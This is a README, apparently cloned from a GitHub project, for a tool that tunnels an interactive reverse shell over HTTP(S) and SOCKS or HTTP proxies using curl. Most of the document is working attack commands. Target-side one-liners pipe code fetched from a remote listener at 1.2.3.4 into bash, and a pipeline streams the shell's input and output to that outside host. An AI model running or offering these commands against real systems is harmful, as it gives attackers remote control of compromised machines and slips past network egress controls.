# Reverse shell using curl

(Cloned from [https://github.com/irsl/curlshell](https://github.com/irsl/curlshell))

During security research, you may end up running code in an environment,
where establishing raw TCP connections to the outside world is not possible;
outgoing connection may only go through a connect proxy (HTTPS_PROXY).
This simple interactive HTTP server provides a way to mux 
stdin/stdout and stderr of a remote reverse shell over that proxy with the
help of curl.

Generate a SSL Certificate:
```sh
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
```

## Without Proxy

```sh
./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
```
```sh
# On the target:
curl -skfL https://1.2.3.4:8080 | bash
```

## With SOCKS Proxy
```sh
./curlshell.py -x socks5h://5.5.5.5:1080 --certificate cert.pem --private-key key.pem --listen-port 8080 
```
```sh
# On the target:
curl -x socks5h://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
```

## With HTTP Proxy
```sh
./curlshell.py -x http://5.5.5.5:3128 --certificate cert.pem --private-key key.pem --listen-port 8080 
```
```sh
# On the target:
curl -x http://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
```

## With HTTP (plaintext)
```sh
./curlshell.py --listen-port 8080
```
```sh
# On the target:
curl -sfL http://1.2.3.4:8080 | bash
```

# How it works
The first cURL request pipes this into a bash:
```sh
stdbuf -i0 -o0 -e0 curl -X POST -sk https://1.2.3.4:8080/input \
    | bash 2> >(curl -sk -T - https://1.2.3.4:8080/stderr) \
    | curl -sk -T - https://1.2.3.4:8080/stdout
```

The bash then starts 3 cURL processes to connect stdin, stdout and stderr. HTTP's 'chunked transfer' does the rest.

